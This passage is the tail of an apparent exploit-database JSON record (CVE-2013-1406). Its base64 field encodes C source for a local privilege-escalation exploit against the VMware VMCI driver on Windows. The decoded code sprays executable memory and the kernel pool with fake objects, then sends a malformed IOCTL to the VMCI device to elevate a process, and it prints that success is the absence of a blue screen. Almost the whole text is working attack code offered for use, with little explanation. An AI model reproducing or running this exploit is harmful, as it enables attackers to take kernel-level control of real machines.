gICAgICAgICAweDFBMDAwMDAwIC0gMHgxQkZGRkZGRiAtIFF1b3RlZCBjaHVuaw0KICAgICAgICAgICAgICAgIDB4MCAtIDB4RkZGRkZGRkYgLSBGcmVlIGNodW5rIC0gbm8gaWRlYQ0KDQogICAgICAgICAgICAgICAgQWRkb24gZm9yIFdpbmRvd3MgNzoNCiAgICAgICAgICAgICAgICBTaW5jZSBQb29sVHlwZSBmbGFncyBoYXZlIGNoYW5nZWQsIGFuZCAiSW4gdXNlIGZsYWciIGlzIG5vdyAweDIsDQogICAgICAgICAgICAgICAgZGVmaW5lIGFuIGFkZGl0aW9uYWwgcmVnaW9uIGZvciBXaW43Og0KDQogICAgICAgICAgICAgICAgMHgwNDAwMDAwMCAtIDB4MDYwMDAwMDAgLSBTdGFuZGFyZCBjaHVuaw0KICAgICAgICAgICAgICAgIDB4MTQwMDAwMDAgLSAweDE2MDAwMDAwIC0gUXVvdGVkIGNodW5rDQogICAgICAgICAgICAqLw0KICAgICAgICAgICAgDQogICAgICAgICAgICBwU2hlbGxTcHJheUJ1ZlN0ZCA9IFZpcnR1YWxBbGxvYygoTFBWT0lEKTB4QTAwMDAwMCwgMHgyMDAwMDAwLCBNRU1fQ09NTUlUIHwgTUVNX1JFU0VSVkUsIFBBR0VfRVhFQ1VURV9SRUFEV1JJVEUpOw0KICAgICAgICAgICAgcFNoZWxsU3ByYXlCdWZRdGQgPSBWaXJ0dWFsQWxsb2MoKExQVk9JRCkweDFBMDAwMDAwLCAweDIwMDAwMDAsIE1FTV9DT01NSVQgfCBNRU1fUkVTRVJWRSwgUEFHRV9FWEVDVVRFX1JFQURXUklURSk7DQogICAgICAgICAgICBwU2hlbGxTcHJheUJ1ZlN0ZDcgPSBWaXJ0dWFsQWxsb2MoKExQVk9JRCkweDQwMDAwMDAsIDB4MjAwMDAwMCwgTUVNX0NPTU1JVCB8IE1FTV9SRVNFUlZFLCBQQUdFX0VYRUNVVEVfUkVBRFdSSVRFKTsNCiAgICAgICAgICAgIHBTaGVsbFNwcmF5QnVmUXRkNyA9IFZpcnR1YWxBbGxvYygoTFBWT0lEKTB4MTQwMDAwMDAsIDB4MjAwMDAwMCwgTUVNX0NPTU1JVCB8IE1FTV9SRVNFUlZFLCBQQUdFX0VYRUNVVEVfUkVBRFdSSVRFKTsNCg0KICAgICAgICAgICAgaWYgKChwU2hlbGxTcHJheUJ1ZlF0ZCA9PSBOVUxMKSB8fCAocFNoZWxsU3ByYXlCdWZRdGQgPT0gTlVMTCkgfHwgKHBTaGVsbFNwcmF5QnVmUXRkID09IE5VTEwpIHx8IChwU2hlbGxTcHJheUJ1ZlF0ZCA9PSBOVUxMKSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBwcmludGYoIlx0Wy1dIFVuYWJsZSB0byBtYXAgdGhlIG5lZWRlZCBtZW1vcnkgcmVnaW9ucywgcGxlYXNlIHRyeSBydW5uaW5nIHRoZSBhcHAgYWdhaW5cbiIpOw0KICAgICAgICAgICAgICAgIENsb3NlSGFuZGxlKGhWTUNJRGV2aWNlKTsNCiAgICAgICAgICAgICAgICByZXR1cm47DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIEluaXRGYWtlQnVmKHBTaGVsbFNwcmF5QnVmU3RkLCAweDIwMDAwMDApOw0KICAgICAgICAgICAgSW5pdEZha2VCdWYocFNoZWxsU3ByYXlCdWZRdGQsIDB4MjAwMDAwMCk7DQogICAgICAgICAgICBJbml0RmFrZUJ1ZihwU2hlbGxTcHJheUJ1ZlN0ZDcsIDB4MjAwMDAwMCk7DQogICAgICAgICAgICBJbml0RmFrZUJ1ZihwU2hlbGxTcHJheUJ1ZlF0ZDcsIDB4MjAwMDAwMCk7DQoNCiAgICAgICAgICAgIFBsYWNlRmFrZU9iamVjdHMocFNoZWxsU3ByYXlCdWZTdGQsIDB4MjAwMDAwMCwgMHgxMDAwMCk7DQogICAgICAgICAgICBQbGFjZUZha2VPYmplY3RzKHBTaGVsbFNwcmF5QnVmUXRkLCAweDIwMDAwMDAsIDB4MTAwMDApOw0KICAgICAgICAgICAgUGxhY2VGYWtlT2JqZWN0cyhwU2hlbGxTcHJheUJ1ZlN0ZDcsIDB4MjAwMDAwMCwgMHgxMDAwMCk7DQogICAgICAgICAgICBQbGFjZUZha2VPYmplY3RzKHBTaGVsbFNwcmF5QnVmUXRkNywgMHgyMDAwMDAwLCAweDEwMDAwKTsNCg0KICAgICAgICAgICAgaWYgKFNldFRocmVhZFByaW9yaXR5KEdldEN1cnJlbnRUaHJlYWQoKSwgVEhSRUFEX1BSSU9SSVRZX1RJTUVfQ1JJVElDQUwpID09IEZBTFNFKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIFNldFRocmVhZFByaW9yaXR5KEdldEN1cnJlbnRUaHJlYWQoKSwgVEhSRUFEX1BSSU9SSVRZX0hJR0hFU1QpOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBQb29sU3ByYXkoKTsNCg0KICAgICAgICAgICAgaWYgKERldmljZUlvQ29udHJvbChoVk1DSURldmljZSwgMHg4MTAzMjA4QywgQmFkQnVmZiwgc2l6ZW9mKEJhZEJ1ZmYpLCByZXRCdWYsIHNpemVvZihyZXRCdWYpLCAmZHdSZXQsIE5VTEwpID09IFRSVUUpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgcHJpbnRmKCJcdFshXSBJZiB5b3UgZG9uJ3Qgc2VlIGFueSBCU09ELCB5b3UncmUgc3VjY2Vzc2Z1bFxuIik7DQoNCiAgICAgICAgICAgICAgICBpZiAoYjcgfHwgYjgpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBSZXN1bWVUaHJlYWQoaFN1c3BUaHJlYWQpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBwcmludGYoIlstXSBOb3QgdGhpcyB0aW1lICVkXG4iLCBHZXRMYXN0RXJyb3IoKSk7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIGlmIChwU2hlbGxTcHJheUJ1ZlN0ZCAhPSBOVUxMKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIFZpcnR1YWxGcmVlKHBTaGVsbFNwcmF5QnVmU3RkLCAwLCBNRU1fUkVMRUFTRSk7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIGlmIChwU2hlbGxTcHJheUJ1ZlF0ZCAhPSBOVUxMKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIFZpcnR1YWxGcmVlKHBTaGVsbFNwcmF5QnVmUXRkLCAwLCBNRU1fUkVMRUFTRSk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBTZXRUaHJlYWRQcmlvcml0eShHZXRDdXJyZW50VGhyZWFkKCksIFRIUkVBRF9QUklPUklUWV9OT1JNQUwpOw0KDQogICAgICAgIENsb3NlSGFuZGxlKGhWTUNJRGV2aWNlKTsNCiAgICB9DQogICAgZWxzZQ0KICAgIHsNCiAgICAgICAgcHJpbnRmKCJbLV0gTGlrZSBJIGRvbid0IHNlZSB2bXdhcmUgaGVyZVxuIik7DQogICAgfQ0KDQogICAgQ2xvc2VIYW5kbGUoaFByb2Nlc3NUb0VsZXZhdGUpOw0KDQogICAgcmV0dXJuOw0KfQ==", 
    "filename": "platforms/multiple/local/40164.c", 
    "id": "40164", 
    "cves": [
        "CVE-2013-1406"
    ]
}